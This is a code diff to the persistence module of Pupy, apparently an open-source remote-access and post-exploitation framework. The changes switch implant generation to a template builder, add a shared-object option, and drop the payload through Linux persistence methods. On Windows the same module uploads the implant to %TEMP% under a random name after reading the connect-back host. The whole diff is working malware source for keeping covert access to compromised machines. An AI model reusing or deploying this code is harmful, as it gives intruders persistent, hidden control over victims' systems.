@@ -15,7 +15,6 @@
 # --------------------------------------------------------------
 from pupylib.PupyModule import *
 from pupylib.PupyCompleter import *
-from modules.lib.linux.migrate import get_payload
 import random
 import pupygen
 import os.path
@@ -35,7 +34,9 @@ class PersistenceModule(PupyModule):
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog="persistence", description=self.__doc__)
-        self.arg_parser.add_argument('-e','--exe', help='Use an alternative file and set persistency', completer=path_completer)
+        self.arg_parser.add_argument('-e', '--exe', help='Use an alternative file and set persistency', completer=path_completer)
+        self.arg_parser.add_argument('-s', '--shared', action='store_true', default=False,
+                                         help='prefer shared object')
 
     def run(self, args):
         if self.client.is_windows():
@@ -45,9 +46,29 @@ class PersistenceModule(PupyModule):
 
     def linux(self, args):
         manager = self.client.conn.modules['persistence'].DropManager()
-        self.info('Available methods: {}'.format(manager.methods))
-        payload = get_payload(self, compressed=False)
-        drop_path, conf_path = manager.add_library(payload)
+        self.success('Available methods: ' + ', '.join(
+            method for method,state in manager.methods.iteritems() if state is True
+        ))
+
+        for method, result in manager.methods.iteritems():
+            if result is not True:
+                self.error('Unavailable method: {}: {}'.format(method, result))
+
+        exebuff, tpl, _ = pupygen.generate_binary_from_template(
+            self.client.get_conf(),
+            self.client.desc['platform'],
+            arch=self.client.arch,
+            shared=args.shared
+        )
+
+        self.success("Generating the payload with the current config from {} - size={}".format(
+            tpl, len(exebuff)))
+
+        if args.shared:
+            drop_path, conf_path = manager.add_library(exebuff)
+        else:
+            drop_path, conf_path = manager.add_binary(exebuff)
+
         if drop_path and conf_path:
             self.success('Dropped: {} Config: {}'.format(drop_path, conf_path))
         else:
@@ -64,11 +85,14 @@ class PersistenceModule(PupyModule):
             res=self.client.conn.modules['pupy'].get_connect_back_host()
             host, port=res.rsplit(':',1)
             #generating exe
-            self.info("generating exe ...")
-            if self.client.desc['proc_arch']=="64bit":
-                exebuff=pupygen.get_edit_pupyx64_exe(self.client.get_conf())
-            else:
-                exebuff=pupygen.get_edit_pupyx86_exe(self.client.get_conf())
+            exebuff, tpl, _ = pupygen.generate_binary_from_template(
+                self.client.get_conf(),
+                self.client.desc['platform'],
+                arch=self.client.arch
+            )
+
+            self.success("Generating the payload with the current config from {} - size={}".format(
+                tpl, len(exebuff)))
 
         remote_path=self.client.conn.modules['os.path'].expandvars("%TEMP%\\{}.exe".format(''.join([random.choice(string.ascii_lowercase) for x in range(0,random.randint(6,12))])))
         self.info("uploading to %s ..."%remote_path)
